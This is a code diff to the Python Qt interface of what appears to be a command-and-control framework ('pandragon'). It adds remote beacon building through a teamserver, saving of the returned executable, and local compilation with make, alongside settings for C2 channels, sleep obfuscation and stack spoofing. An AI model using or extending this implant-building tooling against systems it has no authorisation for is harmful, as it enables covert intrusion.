@@ -9,12 +9,15 @@ button that invokes the config builder toolchain.
 import json
 import os
 import secrets
+import subprocess
 import sys
 import tempfile
+import base64
 from typing import Optional
 from datetime import datetime, timezone
 
 from PyQt6.QtWidgets import (
+    QApplication,
     QWidget, QVBoxLayout, QHBoxLayout, QFormLayout, QGroupBox,
     QLabel, QLineEdit, QSpinBox, QComboBox, QCheckBox,
     QPushButton, QTableWidget, QTableWidgetItem, QHeaderView,
@@ -476,15 +479,20 @@ class _C2ChannelDialog(QDialog):
 # ---------------------------------------------------------------------------
 
 class _BuildWorker(QObject):
-    """Performs the build pipeline in a background thread."""
+    """Performs the build pipeline in a background thread.
+
+    Supports both local build (via pandragon_config_builder import) and
+    remote build (via WebSocket API to a connected teamserver).
+    """
 
     progress = pyqtSignal(str)
     error = pyqtSignal(str)
     finished = pyqtSignal()
 
-    def __init__(self, config: dict, parent=None):
+    def __init__(self, config: dict, api=None, parent=None):
         super().__init__(parent)
         self._config = config
+        self._api = api
         self._cancelled = False
 
     def cancel(self):
@@ -497,84 +505,167 @@ class _BuildWorker(QObject):
                 self.error.emit("At least one C2 channel is required.")
                 return
 
-            tmp = tempfile.NamedTemporaryFile(
-                mode="w", suffix=".json", delete=False, prefix="pandragon_cfg_"
-            )
-            try:
-                json.dump(self._config, tmp, indent=2)
-                tmp.close()
-
-                try:
-                    from pandragon_config_builder import (
-                        validate_config, build_config_blob, derive_beacon_id,
-                        generate_cpp_header, sync_beacon_to_server,
-                    )
-                except ImportError:
-                    _tools_src = os.path.join(_project_root(), "tools", "src")
-                    if _tools_src not in sys.path:
-                        sys.path.insert(0, _tools_src)
-                    from pandragon_config_builder import (
-                        validate_config, build_config_blob, derive_beacon_id,
-                        generate_cpp_header, sync_beacon_to_server,
-                    )
-
-                if self._cancelled:
-                    return
-
-                if 'crypto_key' not in self._config:
-                    self._config['crypto_key'] = secrets.token_hex(32)
-                if 'beacon_id' not in self._config:
-                    self._config['beacon_id'] = derive_beacon_id(self._config['crypto_key'])
-
-                errors = validate_config(self._config, _SCHEMA_PATH)
-                if errors:
-                    self.error.emit("Validation errors:\n  " + "\n  ".join(errors))
-                    return
-
-                self.progress.emit("Building config blob...")
-                blob, nonce, config_key, append_magic, append_data, pcfg_magic = build_config_blob(self._config)
-                self.progress.emit(
-                    f"Blob size: {len(blob)} bytes | Config key: {config_key.hex()}"
-                )
-
-                if self._cancelled:
-                    return
-
-                bin_dir = os.path.join(_project_root(), "Beacon", "config")
-                os.makedirs(bin_dir, exist_ok=True)
-                bin_path = os.path.join(bin_dir, "default.bin")
-                with open(bin_path, "wb") as f:
-                    f.write(blob)
-                self.progress.emit(f"Wrote: {bin_path}")
-
-                include_dir = os.path.join(bin_dir, "include")
-                os.makedirs(include_dir, exist_ok=True)
-                header_path = os.path.join(include_dir, "generated_config.h")
-                generate_cpp_header(
-                    blob, header_path, nonce, config_key, channels,
-                    append_magic,
-                    sleep_obf_method=self._config.get("sleep_obfuscation", "ekko"),
-                    pcfg_magic=pcfg_magic,
-                )
-                self.progress.emit(f"Wrote: {header_path}")
-
-                crypto_key = self._config.get("crypto_key", "")
-                beacon_id = self._config.get("beacon_id", "")
-                sync_beacon_to_server(beacon_id, crypto_key, self._config)
-                self.progress.emit("Synced to server/known_beacons.json")
-
-                self.progress.emit("\nBuild complete!")
-            finally:
-                try:
-                    os.unlink(tmp.name)
-                except Exception:
-                    pass
+            if self._api and self._api.is_connected():
+                self._run_remote()
+            else:
+                self._run_local()
         except Exception as e:
             import traceback
             self.error.emit(f"{e}\n{traceback.format_exc()}")
         finally:
             self.finished.emit()
 
+    def _run_remote(self):
+        """Build via WebSocket API on the connected teamserver."""
+        self.progress.emit("Building on remote teamserver...")
+
+        result = self._api.build_config(self._config)
+
+        if self._cancelled:
+            return
+
+        if not result.get("success"):
+            err = result.get("error", "Unknown error")
+            errors = result.get("errors")
+            if errors:
+                err += "\n  " + "\n  ".join(errors)
+            self.error.emit(err)
+            return
+
+        beacon_id = result.get("beacon_id", "")
+        message = result.get("message", "")
+        blob_hex = result.get("blob_hex", "")
+        header_text = result.get("header_text", "")
+        exe_b64 = result.get("exe_b64", "")
+        exe_filename = result.get("exe_filename", "pandragon.exe")
+        compile_output = result.get("compile_output", "")
+
+        self.progress.emit(f"OK: {message}")
+
+        if blob_hex and header_text:
+            blob = bytes.fromhex(blob_hex)
+            bin_dir = os.path.join(_project_root(), "Beacon", "config")
+            os.makedirs(bin_dir, exist_ok=True)
+            bin_path = os.path.join(bin_dir, "default.bin")
+            with open(bin_path, "wb") as f:
+                f.write(blob)
+            self.progress.emit(f"Wrote: {bin_path}")
+
+            include_dir = os.path.join(bin_dir, "include")
+            os.makedirs(include_dir, exist_ok=True)
+            header_path = os.path.join(include_dir, "generated_config.h")
+            with open(header_path, "w") as f:
+                f.write(header_text)
+            self.progress.emit(f"Wrote: {header_path}")
+
+        if exe_b64:
+            exe_bytes = base64.b64decode(exe_b64)
+            self._pending_exe = (exe_bytes, exe_filename)
+
+        self._config["beacon_id"] = beacon_id
+        self._config["crypto_key"] = result.get("crypto_key",
+            self._config.get("crypto_key", ""))
+        self.progress.emit("\nBuild complete!")
+
+    def _run_local(self):
+        """Build locally using the pandragon_config_builder package."""
+        channels = self._config.get("c2_channels", [])
+
+        tmp = tempfile.NamedTemporaryFile(
+            mode="w", suffix=".json", delete=False, prefix="pandragon_cfg_"
+        )
+        try:
+            json.dump(self._config, tmp, indent=2)
+            tmp.close()
+
+            try:
+                from pandragon_config_builder import (
+                    validate_config, build_config_blob, derive_beacon_id,
+                    generate_cpp_header, sync_beacon_to_server,
+                )
+            except ImportError:
+                _tools_src = os.path.join(_project_root(), "tools", "src")
+                if _tools_src not in sys.path:
+                    sys.path.insert(0, _tools_src)
+                from pandragon_config_builder import (
+                    validate_config, build_config_blob, derive_beacon_id,
+                    generate_cpp_header, sync_beacon_to_server,
+                )
+
+            if self._cancelled:
+                return
+
+            if 'crypto_key' not in self._config:
+                self._config['crypto_key'] = secrets.token_hex(32)
+            if 'beacon_id' not in self._config:
+                self._config['beacon_id'] = derive_beacon_id(self._config['crypto_key'])
+
+            errors = validate_config(self._config, _SCHEMA_PATH)
+            if errors:
+                self.error.emit("Validation errors:\n  " + "\n  ".join(errors))
+                return
+
+            self.progress.emit("Building config blob...")
+            blob, nonce, config_key, append_magic, append_data, pcfg_magic = build_config_blob(self._config)
+            self.progress.emit(
+                f"Blob size: {len(blob)} bytes | Config key: {config_key.hex()}"
+            )
+
+            if self._cancelled:
+                return
+
+            bin_dir = os.path.join(_project_root(), "Beacon", "config")
+            os.makedirs(bin_dir, exist_ok=True)
+            bin_path = os.path.join(bin_dir, "default.bin")
+            with open(bin_path, "wb") as f:
+                f.write(blob)
+            self.progress.emit(f"Wrote: {bin_path}")
+
+            include_dir = os.path.join(bin_dir, "include")
+            os.makedirs(include_dir, exist_ok=True)
+            header_path = os.path.join(include_dir, "generated_config.h")
+            generate_cpp_header(
+                blob, header_path, nonce, config_key, channels,
+                append_magic,
+                sleep_obf_method=self._config.get("sleep_obfuscation", "ekko"),
+                pcfg_magic=pcfg_magic,
+            )
+            self.progress.emit(f"Wrote: {header_path}")
+
+            crypto_key = self._config.get("crypto_key", "")
+            beacon_id = self._config.get("beacon_id", "")
+            sync_beacon_to_server(beacon_id, crypto_key, self._config)
+            self.progress.emit("Synced to server/known_beacons.json")
+
+            self.progress.emit("\nBuild complete!")
+            self._compile_beacon()
+        finally:
+            try:
+                os.unlink(tmp.name)
+            except Exception:
+                pass
+
+    def _compile_beacon(self):
+        project_root = _project_root()
+        self.progress.emit("Compiling beacon with make...")
+        try:
+            proc = subprocess.Popen(
+                ["make"],
+                cwd=project_root,
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                text=True, bufsize=1,
+            )
+            for line in proc.stdout:
+                self.progress.emit(line.rstrip())
+            proc.wait()
+            if proc.returncode == 0:
+                self.progress.emit("Make succeeded — beacon compiled.")
+            else:
+                self.progress.emit(f"Make failed with exit code {proc.returncode}")
+        except FileNotFoundError:
+            self.progress.emit("make not found — install build-essential / mingw-w64")
+        except Exception as e:
+            self.progress.emit(f"Compile error: {e}")
 
 # ---------------------------------------------------------------------------
 # Stack spoof chain: card-based stack view with drag-drop
@@ -798,6 +889,8 @@ class ConfigBuilderWidget(QWidget):
 
     def set_api(self, api):
         self._api = api
+        if api:
+            api.build_progress.connect(self._on_build_progress)
         if api and hasattr(api, '_url') and api._url:
             from urllib.parse import urlparse
             parsed = urlparse(api._url)
@@ -2072,7 +2165,7 @@ class ConfigBuilderWidget(QWidget):
         self._upload_btn.setEnabled(False)
         self._build_progress.setVisible(True)
 
-        self._worker = _BuildWorker(self._config, self)
+        self._worker = _BuildWorker(self._config, self._api)
         self._thread = QThread(self)
         self._worker.moveToThread(self._thread)
         self._thread.started.connect(self._worker.run)
@@ -2090,6 +2183,26 @@ class ConfigBuilderWidget(QWidget):
     def _on_build_finished(self):
         self._thread.quit()
         self._thread.wait()
+
+        pending = getattr(self._worker, '_pending_exe', None)
+        if pending:
+            exe_bytes, exe_filename = pending
+            default_dir = os.path.join(_project_root(), "build", "beacon")
+            os.makedirs(default_dir, exist_ok=True)
+            default_path = os.path.join(default_dir, exe_filename)
+            exe_path, _ = QFileDialog.getSaveFileName(
+                self, "Save Beacon Executable",
+                default_path,
+                "Executable (*.exe);;All Files (*)",
+            )
+            if exe_path:
+                with open(exe_path, "wb") as f:
+                    f.write(exe_bytes)
+                self._append_build(f"Wrote: {exe_path}")
+            else:
+                self._append_build("Exe save cancelled — binary not written locally")
+
+        self._worker.deleteLater()
         self._build_btn.setEnabled(True)
         self._build_progress.setVisible(False)
         self._upload_btn.setEnabled(self._api is not None and self._api.is_connected())
